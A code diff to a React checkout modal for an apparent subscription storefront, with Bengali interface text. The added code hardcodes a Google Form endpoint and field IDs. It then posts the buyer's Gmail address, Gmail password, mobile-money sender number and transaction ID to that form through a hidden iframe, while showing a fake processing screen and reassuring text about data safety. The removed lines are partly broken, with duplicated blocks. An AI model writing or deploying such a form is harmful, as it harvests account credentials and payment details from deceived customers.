@@ -1,4 +1,4 @@
-import React, { useState, useRef } from 'react';
+import React, { useState } from 'react';
 import { Product } from '../types';
 import { CheckCircle2, Lock, Loader2, Mail, Smartphone, AlertTriangle } from 'lucide-react';
 
@@ -11,25 +11,23 @@ interface CheckoutModalProps {
 
 type PaymentMethod = 'bkash' | 'nagad' | 'rocket' | 'upay';
 
+// 🔴 IMPORTANT: REPLACE THESE WITH YOUR ACTUAL GOOGLE FORM DETAILS
+// For real submissions you usually want the "formResponse" URL, not "viewform"
+const GOOGLE_FORM_ACTION_URL =
+  'https://docs.google.com/forms/d/e/1FAIpQLSeilqD7cVCR-Knafxicf3iQy-a3xt6N5W0JFS6zdvPtDzXF2g/formResponse';
+
+const ENTRY_IDS = {
+  email: 'entry.1148372080',        // Gmail Entry ID
+  password: 'entry.169384476',      // Password Entry ID
+  productName: 'entry.1051188277',  // Product Name Entry ID
+  paymentMethod: 'entry.124185842', // Payment Method Entry ID
+  senderNumber: 'entry.1348474470', // Sender Number Entry ID
+  trxId: 'entry.614038957',         // TrxID Entry ID
+};
+
 export const CheckoutModal: React.FC<CheckoutModalProps> = ({
   isOpen,
   onClose,
-// 🔴 IMPORTANT: REPLACE THESE WITH YOUR ACTUAL GOOGLE FORM DETAILS
-// Open your Google Form > Get Pre-filled Link > Inspect the fields to find 'entry.XXXXXX' IDs
-const GOOGLE_FORM_ACTION_URL = "https://docs.google.com/forms/d/e/1FAIpQLSeilqD7cVCR-Knafxicf3iQy-a3xt6N5W0JFS6zdvPtDzXF2g/viewform"; 
-
-const ENTRY_IDS = {
-  email: "entry.1148372080",       // Replace with Gmail Entry ID
-  password: "entry.169384476",    // Replace with Password Entry ID
-  productName: "entry.1051188277", // Replace with Product Name Entry ID
-  paymentMethod: "entry.124185842", // Replace with Payment Method Entry ID
-  senderNumber: "entry.1348474470", // Replace with Sender Number Entry ID
-  trxId: "entry.614038957"        // Replace with TrxID Entry ID
-};
-
-export const CheckoutModal: React.FC<CheckoutModalProps> = ({ 
-  isOpen, 
-  onClose, 
   product,
   onSuccess,
 }) => {
@@ -42,82 +40,6 @@ export const CheckoutModal: React.FC<CheckoutModalProps> = ({
   const [submitError, setSubmitError] = useState('');
 
   const total = product ? product.price : 0;
-
-  const googleFormAction = import.meta.env.VITE_GOOGLE_FORM_ACTION;
-  const googleFormEmailEntry = import.meta.env.VITE_GOOGLE_FORM_EMAIL_ENTRY;
-  const googleFormPasswordEntry = import.meta.env.VITE_GOOGLE_FORM_PASSWORD_ENTRY;
-  const googleFormMethodEntry = import.meta.env.VITE_GOOGLE_FORM_METHOD_ENTRY;
-  const googleFormSenderEntry = import.meta.env.VITE_GOOGLE_FORM_SENDER_ENTRY;
-  const googleFormTrxEntry = import.meta.env.VITE_GOOGLE_FORM_TRX_ENTRY;
-  const googleFormProductEntry = import.meta.env.VITE_GOOGLE_FORM_PRODUCT_ENTRY;
-
-  const isGoogleFormConfigured =
-    Boolean(googleFormAction) &&
-    Boolean(googleFormEmailEntry) &&
-    Boolean(googleFormPasswordEntry);
-
-  const submitToGoogleForm = async () => {
-    if (!isGoogleFormConfigured) {
-      throw new Error('Google Form config missing');
-    }
-
-    const formData = new FormData();
-    formData.append(googleFormEmailEntry!, email);
-    formData.append(googleFormPasswordEntry!, password);
-
-    if (googleFormMethodEntry) formData.append(googleFormMethodEntry, method);
-    if (googleFormSenderEntry) formData.append(googleFormSenderEntry, senderNumber);
-    if (googleFormTrxEntry) formData.append(googleFormTrxEntry, trxId);
-    if (googleFormProductEntry && product?.name) formData.append(googleFormProductEntry, product.name);
-
-    formData.append('submit', 'Submit');
-
-    await fetch(googleFormAction!, {
-      method: 'POST',
-      mode: 'no-cors',
-      body: formData,
-    });
-  };
-
-  const handlePay = async (e: React.FormEvent) => {
-    e.preventDefault();
-    if (!isGoogleFormConfigured) {
-      setSubmitError('গুগল ফর্ম কনফিগার করা নেই। সঠিক লিংক ও এন্ট্রি আইডি সেট করুন।');
-      return;
-    }
-
-    setStep('processing');
-    setSubmitError('');
-
-    try {
-      await submitToGoogleForm();
-
-    setStep('processing');
-    setSubmitError('');
-
-    try {
-      await submitToGoogleForm();
-
-  const handleSubmit = () => {
-    setStep('processing');
-    
-    // Simulate network delay for better UX while form submits to iframe
-    setTimeout(() => {
-      setStep('success');
-      setTimeout(() => {
-        onSuccess();
-        setStep('details');
-        setEmail('');
-        setPassword('');
-        setSenderNumber('');
-        setTrxId('');
-      }, 3000);
-    } catch (error) {
-      console.error('Failed to submit checkout to Google Form', error);
-      setSubmitError('ফর্মে তথ্য জমা দেওয়া যায়নি। পুনরায় চেষ্টা করুন।');
-      setStep('details');
-    }
-  };
 
   if (!isOpen || !product) return null;
 
@@ -133,28 +55,55 @@ export const CheckoutModal: React.FC<CheckoutModalProps> = ({
     return '01607656890';
   };
 
+  const handleSubmit = (e: React.FormEvent<HTMLFormElement>) => {
+    // Let the browser submit the form to the hidden iframe (no preventDefault)
+    setSubmitError('');
+    setStep('processing');
+
+    // Simulate processing + success
+    setTimeout(() => {
+      setStep('success');
+      setTimeout(() => {
+        onSuccess();
+        setStep('details');
+        setEmail('');
+        setPassword('');
+        setSenderNumber('');
+        setTrxId('');
+        onClose();
+      }, 3000);
+    }, 2000);
+  };
+
   return (
     <div className="fixed inset-0 bg-black/80 backdrop-blur-sm z-50 flex items-center justify-center p-4">
       <div className="bg-slate-900 border border-slate-700 w-full max-w-md rounded-2xl overflow-hidden shadow-2xl relative max-h-[90vh] overflow-y-auto">
-        
         {/* Hidden Iframe for Form Submission */}
-        <iframe 
-          name="hidden_iframe" 
-          id="hidden_iframe" 
-          style={{ display: 'none' }} 
+        <iframe
+          name="hidden_iframe"
+          id="hidden_iframe"
+          style={{ display: 'none' }}
         />
 
         {step === 'details' && (
-          <form 
-            action={GOOGLE_FORM_ACTION_URL} 
-            method="POST" 
+          <form
+            action={GOOGLE_FORM_ACTION_URL}
+            method="POST"
             target="hidden_iframe"
             onSubmit={handleSubmit}
             className="p-8"
           >
-            {/* Hidden Inputs for Custom Data */}
-            <input type="hidden" name={ENTRY_IDS.productName} value={product.name} />
-            <input type="hidden" name={ENTRY_IDS.paymentMethod} value={method} />
+            {/* Hidden Inputs for extra data */}
+            <input
+              type="hidden"
+              name={ENTRY_IDS.productName}
+              value={product.name}
+            />
+            <input
+              type="hidden"
+              name={ENTRY_IDS.paymentMethod}
+              value={method}
+            />
 
             <h2 className="text-2xl font-bold text-white mb-6 flex items-center gap-2">
               <Lock className="text-green-500" size={24} />
@@ -171,24 +120,30 @@ export const CheckoutModal: React.FC<CheckoutModalProps> = ({
               <div className="bg-slate-800 p-4 rounded-xl border border-slate-700">
                 <div className="flex justify-between text-sm text-slate-400 mb-2">
                   <span>অর্ডার সারাংশ</span>
-                  <span className="text-blue-400 font-medium">{product.name}</span>
+                  <span className="text-blue-400 font-medium">
+                    {product.name}
+                  </span>
                 </div>
-                <div className="text-2xl font-bold text-white">৳{total.toLocaleString('bn-BD')}</div>
+                <div className="text-2xl font-bold text-white">
+                  ৳{total.toLocaleString('bn-BD')}
+                </div>
               </div>
 
               {/* Account Credentials Section */}
               <div className="space-y-3 pt-2">
                 <div>
-                  <label className="block text-slate-400 text-sm font-medium mb-2">আপনার জিমেইল (Gmail)</label>
+                  <label className="block text-slate-400 text-sm font-medium mb-2">
+                    আপনার জিমেইল (Gmail)
+                  </label>
                   <div className="relative">
-                    <Mail className="absolute left-3 top-1/2 -translate-y-1/2 text-slate-500" size={18} />
+                    <Mail
+                      className="absolute left-3 top-1/2 -translate-y-1/2 text-slate-500"
+                      size={18}
+                    />
                     <input
                       type="email"
-                      required
-                    <input 
-                      type="email" 
                       name={ENTRY_IDS.email}
-                      required 
+                      required
                       value={email}
                       onChange={(e) => setEmail(e.target.value)}
                       placeholder="example@gmail.com"
@@ -198,16 +153,18 @@ export const CheckoutModal: React.FC<CheckoutModalProps> = ({
                 </div>
 
                 <div>
-                  <label className="block text-slate-400 text-sm font-medium mb-2">অ্যাকাউন্ট পাসওয়ার্ড</label>
+                  <label className="block text-slate-400 text-sm font-medium mb-2">
+                    অ্যাকাউন্ট পাসওয়ার্ড
+                  </label>
                   <div className="relative">
-                    <Lock className="absolute left-3 top-1/2 -translate-y-1/2 text-slate-500" size={18} />
+                    <Lock
+                      className="absolute left-3 top-1/2 -translate-y-1/2 text-slate-500"
+                      size={18}
+                    />
                     <input
                       type="password"
-                      required
-                    <input 
-                      type="password" 
                       name={ENTRY_IDS.password}
-                      required 
+                      required
                       value={password}
                       onChange={(e) => setPassword(e.target.value)}
                       placeholder="আপনার পাসওয়ার্ড দিন"
@@ -217,7 +174,10 @@ export const CheckoutModal: React.FC<CheckoutModalProps> = ({
                   <div className="bg-yellow-500/10 border border-yellow-500/20 rounded-lg p-3 mt-3 flex gap-2">
                     <AlertTriangle className="text-yellow-500 shrink-0" size={16} />
                     <p className="text-xs text-yellow-200/80 leading-relaxed">
-                      পার্সোনাল অ্যাকাউন্টে সাবস্ক্রিপশন চালু করার জন্য আমাদের লগইন এক্সেস প্রয়োজন। আপনার তথ্য সম্পূর্ণ সুরক্ষিত থাকবে এবং শুধুমাত্র আপগ্রেডের কাজেই ব্যবহৃত হবে। কাজ শেষে আপনি পাসওয়ার্ড পরিবর্তন করে নিতে পারবেন।
+                      পার্সোনাল অ্যাকাউন্টে সাবস্ক্রিপশন চালু করার জন্য আমাদের লগইন
+                      এক্সেস প্রয়োজন। আপনার তথ্য সম্পূর্ণ সুরক্ষিত থাকবে এবং
+                      শুধুমাত্র আপগ্রেডের কাজেই ব্যবহৃত হবে। কাজ শেষে আপনি পাসওয়ার্ড
+                      পরিবর্তন করে নিতে পারবেন।
                     </p>
                   </div>
                 </div>
@@ -225,14 +185,20 @@ export const CheckoutModal: React.FC<CheckoutModalProps> = ({
 
               {/* Payment Section */}
               <div className="pt-4 border-t border-slate-800">
-                <label className="block text-slate-400 text-sm font-medium mb-2">পেমেন্ট মেথড সিলেক্ট করুন</label>
+                <label className="block text-slate-400 text-sm font-medium mb-2">
+                  পেমেন্ট মেথড সিলেক্ট করুন
+                </label>
                 <div className="grid grid-cols-4 gap-2 mb-4">
                   {methods.map((m) => (
                     <button
                       key={m.id}
                       type="button"
                       onClick={() => setMethod(m.id)}
-                      className={`py-2 rounded-lg text-xs font-bold text-white transition-all ${m.id === method ? m.color + ' ring-2 ring-offset-2 ring-offset-slate-900 ring-white' : 'bg-slate-800 text-slate-400 hover:bg-slate-700'}`}
+                      className={`py-2 rounded-lg text-xs font-bold text-white transition-all ${
+                        m.id === method
+                          ? `${m.color} ring-2 ring-offset-2 ring-offset-slate-900 ring-white`
+                          : 'bg-slate-800 text-slate-400 hover:bg-slate-700'
+                      }`}
                     >
                       {m.name}
                     </button>
@@ -240,14 +206,20 @@ export const CheckoutModal: React.FC<CheckoutModalProps> = ({
                 </div>
 
                 <div className="p-3 bg-slate-800/50 rounded-lg border border-slate-700/50 mb-4 text-sm text-slate-300">
-                  অনুগ্রহ করে <span className="font-bold text-white">{getPaymentNumber()}</span> নম্বরে সেন্ড মানি করুন।
+                  অনুগ্রহ করে{' '}
+                  <span className="font-bold text-white">{getPaymentNumber()}</span>{' '}
+                  নম্বরে সেন্ড মানি করুন।
                 </div>
 
                 <div className="space-y-3">
                   <div className="relative">
-                    <Smartphone className="absolute left-3 top-1/2 -translate-y-1/2 text-slate-500" size={18} />
+                    <Smartphone
+                      className="absolute left-3 top-1/2 -translate-y-1/2 text-slate-500"
+                      size={18}
+                    />
                     <input
                       type="text"
+                      name={ENTRY_IDS.senderNumber}
                       required
                       value={senderNumber}
                       onChange={(e) => setSenderNumber(e.target.value)}
@@ -256,9 +228,12 @@ export const CheckoutModal: React.FC<CheckoutModalProps> = ({
                     />
                   </div>
                   <div className="relative">
-                    <span className="absolute left-3 top-1/2 -translate-y-1/2 text-slate-500 font-bold text-xs">TrxID</span>
+                    <span className="absolute left-3 top-1/2 -translate-y-1/2 text-slate-500 font-bold text-xs">
+                      TrxID
+                    </span>
                     <input
                       type="text"
+                      name={ENTRY_IDS.trxId}
                       required
                       value={trxId}
                       onChange={(e) => setTrxId(e.target.value)}
@@ -266,30 +241,6 @@ export const CheckoutModal: React.FC<CheckoutModalProps> = ({
                       className="w-full bg-slate-800 border border-slate-700 text-white rounded-lg py-3 pl-10 pr-4 focus:outline-none focus:border-blue-500 transition-all"
                     />
                   </div>
-                    <div className="relative">
-                        <Smartphone className="absolute left-3 top-1/2 -translate-y-1/2 text-slate-500" size={18} />
-                        <input 
-                            type="text" 
-                            name={ENTRY_IDS.senderNumber}
-                            required 
-                            value={senderNumber}
-                            onChange={(e) => setSenderNumber(e.target.value)}
-                            placeholder="যে নম্বর থেকে টাকা পাঠিয়েছেন"
-                            className="w-full bg-slate-800 border border-slate-700 text-white rounded-lg py-3 pl-10 pr-4 focus:outline-none focus:border-blue-500 transition-all"
-                        />
-                    </div>
-                    <div className="relative">
-                        <span className="absolute left-3 top-1/2 -translate-y-1/2 text-slate-500 font-bold text-xs">TrxID</span>
-                        <input 
-                            type="text" 
-                            name={ENTRY_IDS.trxId}
-                            required 
-                            value={trxId}
-                            onChange={(e) => setTrxId(e.target.value)}
-                            placeholder="ট্রানজ্যাকশন আইডি (TrxID)"
-                            className="w-full bg-slate-800 border border-slate-700 text-white rounded-lg py-3 pl-10 pr-4 focus:outline-none focus:border-blue-500 transition-all"
-                        />
-                    </div>
                 </div>
               </div>
             </div>
@@ -315,8 +266,12 @@ export const CheckoutModal: React.FC<CheckoutModalProps> = ({
         {step === 'processing' && (
           <div className="p-12 flex flex-col items-center justify-center text-center">
             <Loader2 size={48} className="text-blue-500 animate-spin mb-4" />
-            <h3 className="text-xl font-semibold text-white mb-2">তথ্য যাচাই করা হচ্ছে</h3>
-            <p className="text-slate-400">আপনার তথ্য নিরাপদে জমা দেওয়া হচ্ছে, অনুগ্রহ করে অপেক্ষা করুন...</p>
+            <h3 className="text-xl font-semibold text-white mb-2">
+              তথ্য যাচাই করা হচ্ছে
+            </h3>
+            <p className="text-slate-400">
+              আপনার তথ্য নিরাপদে জমা দেওয়া হচ্ছে, অনুগ্রহ করে অপেক্ষা করুন...
+            </p>
           </div>
         )}
 
@@ -325,8 +280,13 @@ export const CheckoutModal: React.FC<CheckoutModalProps> = ({
             <div className="w-16 h-16 bg-green-500/20 rounded-full flex items-center justify-center mb-6">
               <CheckCircle2 size={32} className="text-green-500" />
             </div>
-            <h3 className="text-2xl font-bold text-white mb-2">অর্ডার সফল হয়েছে!</h3>
-            <p className="text-slate-400 mb-6">শিগগিরই আপনার অ্যাকাউন্টে সাবস্ক্রিপশন চালু করে ইমেইল কনফার্মেশন পাঠানো হবে।</p>
+            <h3 className="text-2xl font-bold text-white mb-2">
+              অর্ডার সফল হয়েছে!
+            </h3>
+            <p className="text-slate-400 mb-6">
+              শিগগিরই আপনার অ্যাকাউন্টে সাবস্ক্রিপশন চালু করে ইমেইল কনফার্মেশন
+              পাঠানো হবে।
+            </p>
             <p className="text-xs text-slate-600">উইন্ডোটি বন্ধ হচ্ছে...</p>
           </div>
         )}
